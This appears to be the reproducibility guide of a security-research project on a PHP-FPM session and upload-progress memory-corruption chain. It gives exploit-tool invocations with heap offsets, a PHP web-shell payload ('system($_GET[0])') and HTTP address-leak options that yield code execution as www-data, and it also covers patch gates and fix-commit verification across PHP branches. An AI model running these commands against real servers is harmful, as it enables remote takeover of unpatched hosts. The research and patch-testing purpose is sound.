# Reproducibility

## 1. No-target checks

```bash
python3 -m unittest discover -s tests -v
python3 src/tools/fpm_chain_smoke.py
python3 src/tools/fpm_reclaim_smoke.py
python3 -m py_compile $(find src tests -name '*.py')
```

These check the 128M patch layout, the 8M reclaim payload offsets, profiles
and map markers. They send no network traffic.

## 2. FPM 128M proof

Environment:

- PHP 8.4.26 FPM, `memory_limit=128M`, `post_max_size=8M`,
  `display_errors=Off`, `session.save_path=/var/lib/php/sessions`,
  `session.upload_progress.enabled/cleanup=On`, `pm=static`, 1 worker;
- `/index.php` calls `session_start()`; `/sess.php` stores two scalars.

```bash
python3 src/tools/fpm_chain.py \
  --url http://<lab> --workers 1 --attempts 1 --stages r3 \
  --e-off 0x83000 --dt-off 0x6b000 --writer 0x581e0 \
  --big-dt-size 13312 --big-e-size 45056 \
  --base-dt 0x68018 --base-e 0x81018 \
  --r3-scalars 2 --victim-sid vic --victim-path /sess.php \
  --r3-key '<?php system($_GET[0]); ?>' --r3-dt-used 0 \
  --big 53 --prime-press 400 --plain /index.php --index /index.php
```

Expected: `PROOF: uid=33(www-data)` via `/shell.php?0=id`.

## 3. FPM 8M reclaim proof

Environment: debug PHP 8.4.26 `-g`; chain pool 8M + builder pool 64M; shared
session dir; nginx 8080 -> chain, 8081 -> builder; pages in
`labs/fpm/reclaim/`.

```bash
python3 src/tools/fpm_reclaim.py \
  --base http://<lab>:8080 --builder http://<lab>:8081 \
  --chunk <chunk> --pie <pie> --zif-offset <off> \
  --d-off 0x6f000 --k 0xfe8 --pads '' --size 8192 \
  --cmd 'id>out/p1' --proof /out/p1
```

Expected: `consumer 502`, then `PROOF: uid=33(www-data)`.

Bases are stable for the FPM master lifetime. In a lab they can be read from
gdb (`main_chunk`, `basic_globals`) or `/proc/<pid>/maps`; `--leak` obtains
them over HTTP instead:

```bash
python3 src/tools/fpm_reclaim.py \
  --base http://<lab>:8080 --builder http://<lab>:8081 \
  --zif-offset 0x50a0f0 --leak --leak-profile official \
  --cmd 'id>out/p1' --proof /out/p1
```

`--leak-profile debug` uses the two-stage PCRE leak (`read+0x3e38`),
`official` uses the `chunk+0x56c60` handler table (`read+0x13b8` on the
official 8.4.26 build). The 4-worker layout needs three pinned children
(`labs/fpm/www/pin.php`); create a writable `out/` before the run.

## 4. 8.5.11 / 8.2.34 pure-HTTP chain

Environment (either profile):

- PHP 8.5.11 FPM (`p2s-fpm8511-128`, host port 19113) or PHP 8.2.34 FPM
  (`p2s-fpm8234-128`, host port 19134), `memory_limit=128M`, single static
  worker, `session.save_path=/var/lib/php/sessions`;
- `session.upload_progress.cleanup=Off` (8.5.11: conf.d override, e.g.
  `/usr/local/etc/php/conf.d/zz-r41-lab.ini`; 8.2.34: `labs/fpm/php-128m-8234.ini`,
  a copy of `php-128m.ini` with cleanup=Off);
- nginx `client_max_body_size=0`; neutral `/plain.php` and `/index.php`
  pages; prime page `labs/fpm/www/_r41prime2.php` (installed by the runner
  when missing).

```bash
# full round-based chain (each round restarts the container and clears state):
ROUNDS=3 bash labs/fpm/r41_http_chain.sh --clean          # PROFILE=8511
PROFILE=8234 ROUNDS=3 CAL=p2s-fpm8234-128 PORT=19134 \
  bash labs/fpm/r41_http_chain.sh --clean                 # real-CVE quadrant

# single stages for debugging: STAGE=prime|r1|r2a|r2b|r3|selftest
STAGE=selftest bash labs/fpm/r41_http_chain.sh            # sampler negative control

# matrix (proof is the host-side /x.php?0=id read-back):
python3 code/tools/verify_matrix.py --only fpm-8511-http-1w --http-only
python3 code/tools/verify_matrix.py --only fpm-8234-http-1w --http-only
```

Expected: `PASS=3/3`, `NO-GDB CHECK rounds=3 gdb_hits=<measured 0>`, and the
final judge line contains `uid=33`. R2a/R2a(K2) return 502 by design; judge
on session bytes, not HTTP codes. Geometry constants and the carrier floor
`F` are per version and per shape/plane - see
`docs/research/fpm-8511-http.md` and `docs/research/fpm-8234-port.md`.

## 5. 4-worker pure-HTTP chains

Same engine chains as section 4, orchestrated for `pm=static` 4 with a lab
scheduling precondition: three concurrent `GET /_sleep.php?t=$SLEEP_T`
requests hold three of the four children; the only free child receives
grow/prime/R2a/R3. The lab must be exclusive (the sleepers occupy 3/4
workers).

Environment additions: `pm=static` / `pm.max_children=4` (`www-4.conf`),
`request_terminate_timeout` greater than the pin window (120 s in the 4w
labs), `cleanup=Off` ini (8.2.34: `labs/fpm/php-128m-8234.ini`; 8.5.11: a
`zz-r40-lab.ini`-style conf.d override - the shared `php-128m.ini` is
`cleanup=On`), lab pages `labs/fpm/www/_r41prime2.php` and `_sleep.php`, and
`--cap-add SYS_PTRACE` only for the optional one-shot calibration.

```bash
# 8.5.11 4w (container p2s-fpm8511-4w, host port 19142)
WORKERS=4 ROUNDS=3 CAL=p2s-fpm8511-4w PORT=19142 \
  bash labs/fpm/r41_http_chain.sh --clean        # ASSERT4 OK x3

# 8.2.34 4w (container p2s-fpm8234-4w, host port 19138)
PROFILE=8234 WORKERS=4 ROUNDS=3 CAL=p2s-fpm8234-4w PORT=19138 \
  bash labs/fpm/r41_http_chain.sh --clean

# optional one-shot pinning assertion (calibration only, never in 3/3 runs)
P4W_GDB=1 WORKERS=4 ROUNDS=1 ... bash labs/fpm/r41_http_chain.sh --clean

python3 code/tools/verify_matrix.py --only fpm-8234-http-4w --http-only
python3 code/tools/verify_matrix.py --only fpm-8511-http-4w --http-only
```

Expected: every round prints `ASSERT4 OK ...`; the final judge line contains
`uid=33`; `NO-GDB CHECK rounds=3 gdb_hits=<measured 0>`. Stage codes are
asserted (R2a/R2a(K2) 502, R3 200). With `log_errors=Off` the OOM fatal text
is unavailable and the runner reports `fatal=inferred(500/0B)`. Pinning is a
lab scheduling layer, not a vulnerability primitive - see
`docs/research/fpm-8234-4w.md` and `docs/research/fpm-8511-4w.md`.

## 6. 8.2.35 patch gate

The 8.2-branch fix is checked by a fail-closed gate (not a proof): the gate
replays the same HTTP-only steps and prints `PATCH GATE: closed` (exit 0) on
the patched build, `PATCH GATE: OPEN (REGRESSION)` (exit 3) if the chain is
unexpectedly exploitable, or `PATCH GATE: ERROR ...` (exit 2) on a
config/instrument error - exit 2 is never a pass. Unknown `PROFILE` values
also exit 2.

```bash
# 8.2.35 gate (expect closed, exit 0)
PROFILE=8235 CAL=p2s-fpm8235-128 PORT=19140 RUNS=3 \
  bash labs/fpm/r41_patch_gate82.sh
# 8.2.34 positive control (expect OPEN (expected on vulnerable), exit 3)
PROFILE=8234 CAL=p2s-gate8234-ctl PORT=19141 RUNS=1 \
  bash labs/fpm/r41_patch_gate82.sh
```

On 8.2.35 the prime still ends in 500/0 B with the OOM fatal and an unchanged
child PID, but `BG level=0`; R2a/R2a(K2) return 200 with SR=361/698 B (not
47/70), R3 returns 200 without `x.php`, and `?0=id` is `File not found.`.
See `docs/research/fpm-8235-gate.md`. A gate says "this chain does not work
here", not "the build is fully safe" (CVE-2026-115560 is separate).

## 7. 4-worker patched gate

The 8.5.12 gate is also run in `WORKERS=4` pin mode (`r41_patch_gate4w.sh`),
which holds 3 of 4 children with `_sleep.php` so each prime and its stage land
on the same free child. This covers the multi-worker blind spot of the 1w gate;
the verdict semantics are identical (`closed` 0 / `OPEN (REGRESSION)` 3 /
`ERROR` 2, never a pass on error).

```bash
# 8.5.12 4w gate (expect closed, exit 0)
PROFILE=8512 WORKERS=4 CAL=p2s-gate8512-4w PORT=19143 RUNS=3 \
  bash labs/fpm/r41_patch_gate4w.sh
# 8.5.11 4w positive control (expect OPEN (expected on vulnerable), exit 3)
PROFILE=8511 WORKERS=4 CAL=p2s-gate8511-4w PORT=19144 RUNS=3 \
  bash labs/fpm/r41_patch_gate4w.sh
python3 code/tools/verify_matrix.py --only fpm-8512-gate-4w
```

8.2 branch (same script; `PROFILE=8235` gate / `8234` control; pin the image
ID with `EXPECT_IMAGE`):

```bash
# 8.2.35 4w gate (expect closed, exit 0)
PROFILE=8235 WORKERS=4 CAL=p2s-gate8235-4w PORT=19148 RUNS=3 \
  EXPECT_IMAGE=sha256:ac855a04... bash labs/fpm/r41_patch_gate4w.sh
# 8.2.34 4w positive control (expect OPEN (expected on vulnerable), exit 3)
PROFILE=8234 WORKERS=4 CAL=p2s-gate8234-4w PORT=19149 RUNS=3 \
  bash labs/fpm/r41_patch_gate4w.sh
python3 code/tools/verify_matrix.py --only fpm-8235-gate-4w
```

8.3 branch (same script; `PROFILE=8336` gate / `8335` control; the BG level
offset is `+0x360` for 8.3):

```bash
# 8.3.36 4w gate (expect closed, exit 0)
PROFILE=8336 WORKERS=4 CAL=p2s-gate8336-4w PORT=19152 RUNS=3 \
  EXPECT_IMAGE=sha256:b229bcfd... bash labs/fpm/r41_patch_gate4w.sh
# 8.3.35 4w positive control (expect OPEN (expected on vulnerable), exit 3)
PROFILE=8335 WORKERS=4 CAL=p2s-gate8335-4w PORT=19153 RUNS=3 \
  bash labs/fpm/r41_patch_gate4w.sh
python3 code/tools/verify_matrix.py --only fpm-8336-gate-4w
```

8.4 branch (`PROFILE=8427` gate / `8426` control; **registered** after
re-baselining to the 8.4 prime plane):

```bash
# 8.4.27 4w gate (closed expected; matrix fpm-8427-gate-4w)
PROFILE=8427 WORKERS=4 CAL=p2s-gate8427-4w PORT=19154 RUNS=3 \
  EXPECT_IMAGE=sha256:26ba8279... bash labs/fpm/r41_patch_gate4w.sh
# 8.4.26 4w positive control (OPEN (expected on vulnerable), exit 3)
PROFILE=8426 WORKERS=4 CAL=p2s-gate8426-4w PORT=19155 RUNS=3 \
  EXPECT_IMAGE=sha256:6658d56c... bash labs/fpm/r41_patch_gate4w.sh
```

Expected gate signature: 8.5 = grow SP 7,050,470 B, SR 469 -> 374 -> 724;
8.2 and 8.3 = grow 7,048,390 B, SR 456 -> 361 -> 698 (BG level fields
`+0x358` / `+0x360`); 8.4 = grow 7,050,470 B, SR 469 -> 374 -> 724 (BG
`+0x370`; calibrated aim -93688 / AIM_W -99777 / S=0x84000 / progress
chunk+0x61000 from the 8.4 plane d=0xFD000 / E=0x119000 / DT=0x100000). All
prime 500/0 B (fatal inferred), BG all 0, no `x.php`/`uid`. Controls show
SR 47/70, `x.php` 392 B, `uid=33` and one `level=1`. The 8.4.26 control only
opens under the calibrated 8.4 plane (8.5-family constants give ERROR,
8.2-family constants give a closed-like shape), so a positive control is not
optional. A first-run `OPEN (REGRESSION)` is not automatically a regression:
check the instrument before opening a P0 - see
`docs/research/fpm-8512-gate-4w.md`, `fpm-8235-gate-4w.md`,
`fpm-8336-gate-4w.md` and `fpm-8427-gate-4w-poc.md`.

E7 numeric alignment: the patched R2a 374/361 B session files are normal
`a:5` progress records (byte decomposition and gate-predicate interpretation
in `docs/research/e7-mechanism-verification.md` §7; main log `docs/121`).
Cross-branch **full 3x**: `docs/research/gate-family-crossbranch-2026-10-31.md`
(18/18 gates + 12/12 controls PASS; the earlier 1-run smoke is marked
superseded). Raw evidence:
`labs/fpm/evidence/gate-family-crossbranch-2026-10-31.txt`.

Selector rule: `code/tools/verify_matrix.py --only` takes **exact**
comma-separated case names (a prefix never selects `-4w` siblings);
`--only-substr` is the explicit legacy substring filter; an unknown name exits
**2** (rc=2) and prints the substring matches as a hint. The matrix wrapper
`fpm8512_gate_case.py` now defaults to `--gdb-bg 1`, so a caller's
`GDB_BG=0` is not inherited (that inheritance made hardened closed runs report
`BG unverified`).

## 8. Release day (any branch)

`labs/fpm/r50_release_day_any.sh` is the generic fail-closed entry point for
any branch release (8.2.36, 8.3.37, 8.4.28, 8.5.13, ...): pull the
exact-version base -> build the lab image -> re-baseline against the FAMILY
signature (FAMILY 82/83: grow 7,048,390 / SR 361/698 / BG `+0x358`/`+0x360`;
84/85: grow 7,050,470 / SR 374/724 / BG `+0x370`) -> `RUNS>=3` closed ->
same-branch vulnerable control `RUNS>=3` OPEN, pinned by
`CONTROL_EXPECT_IMAGE` and required to show SR 47/70, `x.php` 392 B,
`uid=33` -> unknown PROFILE exit 2. A 1-run pass is never accepted.

```bash
# example: 8.2.36 when released (FAMILY 82 supplies the expected values)
FAMILY=82 VERSION=8.2.36 PROFILE=8236 CONTROL_PROFILE=8235 \
  CAL=p2s-gate8236-4w PORT=19156 \
  CONTROL_CAL=p2s-gate8235-4w CONTROL_PORT=19148 \
  CONTROL_EXPECT_IMAGE=sha256:... RUNS=3 \
  bash labs/fpm/r50_release_day_any.sh
```

The gate script is hardened (`sha256 4a94d199...3ec66bf`): a PASS requires the
BG scan verified (`GDB_BG=0` -> exit 2 unless `ALLOW_BG_UNVERIFIED=1`), the
3-sleeper pin alive, and the pinned lab page sha (`EXPECT_PAGE_SHA256`). Use
`--only <exact-case>` when re-running a single matrix case (see §7). The
8.5.13-specific preset `labs/fpm/r49_release_day_8513.sh` remains available
(port 19145, DIAG first, 8.5.11 control); the 8.5.13 gate is not in the matrix
yet (unreleased), and CVE-2026-115560 is still tested separately.

## 9. Fix-commit verification

The gate evidence can be checked against the upstream fix itself:
CVE-2026-109618/109619 are closed by one patch per branch (PHP 8.5.12
`31c0ea7d7f`, PHP 8.2.35 `01a40e89fb`, PHP 8.3.36 `3c832b523e` - committer
date 2026-10-18T17:23:18Z, released as a pure security release - plus
NEWS/version commits; the public replay `3584a98bda` has an identical diff).
The patch removes cross-request
stale state rather than the OOM: delayed OOM instead of bailout,
`php_basic_early_rinit()` reset before rfc1867, incomplete-class-only decode
with `php_session_initialize()==FAILURE` fail-fast, rfc1867 OOM early stop and
header filtering, `$_SESSION` delete; `php_session_cancel_decode` is
unchanged (GH-24493 remains open). See
`docs/research/fix-commits-2026-10-31.md` for the commit table, changed-file
line counts and the mechanism <-> gate-observation mapping.

To re-verify from a checkout:

```bash
git log --oneline --grep='Avoid state corruption via bailout'  # find patch
git show 31c0ea7d7f --stat        # 8.5.12 release content
git show 3c832b523e --stat        # 8.3.36 release content
git show 3584a98bda --stat        # public 8.2 replay (identical diff)
```

## 10. MANIFEST verification

`MANIFEST.md` sha256 values are hashes of the **committed Git blobs (LF)**, so
a fresh clone and `git cat-file blob HEAD:<path>` reproduce them. On a Windows
checkout that converted line endings (CRLF) the worktree bytes differ and
hashing them gives false positives - restore before comparing:

```bash
# after editing on Windows, before comparing hashes
git checkout -- .
# or hash the committed blob directly
git cat-file blob HEAD:src/profiles.py | sha256sum
python code/tools/build_release.py --release . --check   # MANIFEST_OK
```

Never regenerate or re-verify the manifest from a CRLF worktree; a fresh
clone with `bad=0` is the authoritative check.

## 11. Oracle rules

- Clear the proof file before the run.
- Accept a proof only if its content matches (e.g., `uid=`).
- `502` after the fire is expected; it is not proof by itself.
- A single proof is not determinism; run 3/3 or 10/10 for a claim.
- Record the exact image tag/digest and build fingerprint with every geometry
  conclusion.

## 12. Nondeterminism

- ASLR/heap state: use a fresh worker/container.
- Delayed OOM: the child may survive a fatal error; kill/restart before scans.
- Worker rotation: the pinner/worker count must match the target.
- Official stripped images: the 128M heap constants transfer; the 8M reclaim
  needs `zif_system`, which is not exported on the official stripped binary but
  has the same code layout (`0x50a0f0` for `php:8.4.26-fpm`).
